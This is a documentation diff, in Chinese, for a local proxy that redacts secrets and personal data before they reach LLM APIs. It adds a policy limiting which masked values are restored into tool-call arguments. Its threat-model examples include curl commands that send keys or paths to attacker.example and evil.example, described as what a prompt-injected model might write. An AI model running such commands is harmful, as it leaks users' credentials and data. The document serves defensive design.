@@ -292,6 +292,23 @@ sequenceDiagram
 
 判讀逐一讀過每個字元，串流在哪裡切開都得到同樣的結果（佔位符或 URL 跨越多個 SSE 事件也一樣）。每個在工具參數中遇到的已綁定佔位符都記一行日誌，見第 10 節。
 
+### 工具參數的還原政策
+
+工具呼叫參數只還原 `toolRestore` 允許的類別；其他類別的已綁定佔位符保持原樣交給用戶端，計入 `kept`。代理不知道用戶端的工具做什麼，所以以類別決定：被提示注入的模型寫出 `bash: curl -d ⟦KEY_1⟧ https://attacker.example`，用戶端執行的是佔位符，金鑰不會經由工具離開電腦。
+
+| 設定 | 預設 | 意思 |
+| --- | --- | --- |
+| `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | `tools` 沒有列出的工具（以及名稱未知的工具）還原的類別。 |
+| `toolRestore.tools` | 無 | 依工具名稱完全比對；每個工具的清單取代 `categories`，所以要保留路徑就把 `PATH` 一起列上。`"*"` 還原所有類別。 |
+
+預設只含寫程式需要原樣往返的值：家目錄路徑與程式碼中的識別字（`projectNames`、`terms`）。`terms` 也常用來列人名，列在其中的人名同樣會還原進工具參數；不想這樣就縮小預設類別。`NAME`、`HOST`、`IP` 不在預設中：`NAME` 是人名模型找到的個人資料；內部主機名稱與 IP 還原進 shell 指令後，可能被送到攻擊者指定的位置，透露內部網路配置。憑證、卡號、身分證號、IBAN、email、電話也都不在預設中。代價是需要這些值的工具（例如設定 commit 作者、寄信）拿到佔位符，呼叫可能失敗或寫入佔位符，必須由使用者明確允許：
+
+```json
+{ "toolRestore": { "tools": { "git_commit": ["PATH", "TERM", "PROJECT", "EMAIL"] } } }
+```
+
+URL 內的佔位符不論類別一律保持原樣；回覆文字（含 reasoning）不受這個政策影響。有效類別為 `EMAIL`、`PATH`、`KEY`、`TWID`、`PHONE`、`TAXID`、`CARD`、`IP`、`HOST`、`ENTROPY`、`IBAN`、`NATID`、`PROJECT`、`TERM`、`NAME`、`ORG`、`LOC`、`ADDR`；不認得的類別讓啟動失敗，錯誤訊息列出有效類別。
+
 ## 8. 對話內編號與 previous_response_id
 
 代理不保存對話的對照表：每個請求都從整份請求重新推導編號。這是刻意的取捨：
@@ -330,11 +347,12 @@ sequenceDiagram
 POST /v1/chat/completions -> 200 masked 3 (EMAIL 1, TWID 1, PATH 1) restored 3 unknown 0 7ms
 ```
 
-工具呼叫參數中的每個已綁定佔位符另記一行：還原（`restored`）或因位於 URL 內而保留（`kept inside a URL`）、佔位符 id、工具名稱、參數的 JSON 路徑。同一行在同一個請求中只記一次（Responses 串流會把參數重送多次）。工具名稱與路徑中的鍵不合識別字格式時寫成 `<tool>`、`<key>`。有保留時（含回覆文字中 URL 內的佔位符），請求那一行多出 `kept N`。
+工具呼叫參數中的每個已綁定佔位符另記一行：還原（`restored`）、因位於 URL 內而保留（`kept inside a URL`）或因類別不在[工具還原政策](#工具參數的還原政策)中而保留（`kept by the tool restore policy`），以及佔位符 id、工具名稱、參數的 JSON 路徑。同一行在同一個請求中只記一次（Responses 串流會把參數重送多次）。工具名稱與路徑中的鍵不合識別字格式時寫成 `<tool>`、`<key>`。有保留時（含回覆文字中 URL 內的佔位符），請求那一行多出 `kept N`。
 
 ```text
 POST /v1/messages tool arguments: kept inside a URL EMAIL_1 in web_fetch at /url
 POST /v1/messages tool arguments: restored PATH_1 in read at /path
+POST /v1/messages tool arguments: kept by the tool restore policy KEY_1 in bash at /command
 ```
 
 `debugMasked`（或 `REDACTION_PROXY_DEBUG_MASKED=1`）會額外記錄每個遮罩後的請求本文。內容只有遮罩後的文字，但仍包含所有未被偵測到的內容，預設關閉。
@@ -350,7 +368,7 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
 - 繞過代理的用戶端，或用戶端直接連自家伺服器的功能（遙測、Cursor 後端）；
 - 同一台電腦上的其他程式或使用者：沒設 `authToken` 時，他們可以呼叫代理（包括使用環境變數中的備援金鑰）；設了也擋不住讀取代理記憶體。網頁則擋得住：不允許的 `Origin` 與非本機 `Host`（DNS rebinding）以 403 拒絕；
 - 惡意上游誘導模型以非標準形式寫回值（還原只填佔位符，從不把原始值送往上游）；
-- 惡意上游或提示注入讓模型把佔位符寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦EMAIL_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。工具參數與回覆文字中 URL 內的佔位符不還原（第 7 節），工具參數中的每次還原都記入日誌；
+- 惡意上游或提示注入讓模型把允許還原的類別寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦PATH_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。預設只有 `PATH`、`TERM`、`PROJECT` 還原進工具參數，其他類別以佔位符交給工具，除非使用者為該工具開放（[工具還原政策](#工具參數的還原政策)）；工具參數與回覆文字中 URL 內的佔位符不還原，工具參數中遇到的每個佔位符都記入日誌；
 - 輸入者刻意規避（例如用規則不會折疊的字元拆開一個值）。
 
 代理預設只綁定 `127.0.0.1`，此時 `authToken` 可不設。`host` 設成非本機位址（例如容器內的 `0.0.0.0`）時必須設 `authToken`，否則拒絕啟動：連得到該埠的主機若沒有權杖，就無法透過代理使用它轉送的憑證（包括環境變數中的備援金鑰）。權杖放在專用標頭 `x-redaction-proxy-token`，因為 `authorization` 與 `x-api-key` 要帶上游金鑰；代理不轉送它。帶正確權杖的請求不檢查 `Host`，所以其他容器可以用服務名稱連線；DNS rebinding 的網頁拿不到權杖，而自訂標頭會觸發只有允許來源才通過的 CORS 預檢。權杖以明文 HTTP 傳送，只在可信任的網路（本機、容器網路）上使用。
@@ -368,6 +386,10 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
   "anthropicUpstream": "https://api.anthropic.com",
   "screen": "replace",
   "debugMasked": false,
+  "toolRestore": {
+    "categories": ["PATH", "TERM", "PROJECT"],
+    "tools": { "git_commit": ["PATH", "TERM", "PROJECT", "EMAIL"] }
+  },
   "redaction": {
     "terms": ["林小明", "Denise Whitlock"],
     "projectNames": ["Nimbus"],
@@ -388,6 +410,8 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
 | `allowInsecureUpstream` | `REDACTION_PROXY_ALLOW_INSECURE_UPSTREAM=1` | `false` | 允許以明文 `http://` 連到非本機的上游。未設定時這種上游會讓啟動失敗，因為 API 金鑰會以明文傳送。 |
 | `screen` | `REDACTION_PROXY_SCREEN` | `replace` | `replace` 或 `refuse`，見第 9 節。 |
 | `debugMasked` | `REDACTION_PROXY_DEBUG_MASKED=1` | `false` | 記錄遮罩後的請求本文。 |
+| `toolRestore.categories` | `REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗號分隔） | `PATH`、`TERM`、`PROJECT` | 還原進工具呼叫參數的類別，或 `"*"`（全部）；空字串代表都不還原。見[第 7 節](#工具參數的還原政策)。 |
+| `toolRestore.tools` | — | 無 | 依工具名稱完全比對的類別清單或 `"*"`，取代該工具的 `categories`。 |
 | `redaction.rules` | — | `card`、`entropy` 以外全部 | 啟用的內建規則；空陣列停用所有內建偵測。代理預設啟用 42 條：全部規則，但以 `card-strict`、`entropy-strict` 取代 `card`、`entropy`（上例即代理預設）。直接使用核心的宿主（`new RulesDetector()`）預設只有臺灣與通用的 10 條（`DEFAULT_RULE_NAMES`），見下方說明。 |
 | `redaction.terms` | — | 無 | 以 `TERM` 遮罩的字面值，例如人名。 |
 | `redaction.projectNames` | — | 無 | 以 `PROJECT` 遮罩的字面值，例如代號。 |
@@ -522,7 +546,7 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 | 會改動一些字元 | 預設把控制字元換成可見字元（`␛`），把原文中的 `⟦` `⟧` 換成 `⟪` `⟫`。 |
 | 重啟會忘記接續對話與已知原始值 | Responses API 的 `previous_response_id` 依賴記憶體中最近 256 個回應；重啟或被擠出後，接續請求以 422 拒絕。已知原始值（第 8 節）重啟後也會忘記。 |
 | 本機預設沒有驗證 | 預設只綁定 `127.0.0.1`；沒設 `authToken` 時，你電腦上的任何程式都能使用它。網頁的請求（不允許的 `Origin`、DNS rebinding）以 403 拒絕。 |
-| 只有 URL 內不還原 | 回應中 URL 內的佔位符保持原樣（合法的 `https://host/⟦PATH_1⟧` 也一樣）；工具參數的其他位置照常還原並記入日誌，所以 shell 指令等仍可能把原始值送出。 |
+| 工具參數只還原允許的類別 | 回應中 URL 內的佔位符保持原樣（合法的 `https://host/⟦PATH_1⟧` 也一樣）。工具參數只還原 `toolRestore` 允許的類別（預設 `PATH`、`TERM`、`PROJECT`），需要其他值的工具拿到佔位符，可能失敗，直到使用者為它開放。允許的類別照常還原並記入日誌，所以 shell 指令等仍可能把它們送出。 |
 | 請求大小 | 本文超過 64 MiB 以 413 拒絕。 |
 | 尚未對真實服務測試 | 測試與示範都用本機假上游，尚未對 OpenAI、Anthropic、DeepSeek 或真實用戶端驗證。驗證工具已備妥（[e2e/real](../e2e/real/README.md)），尚未執行。 |
 
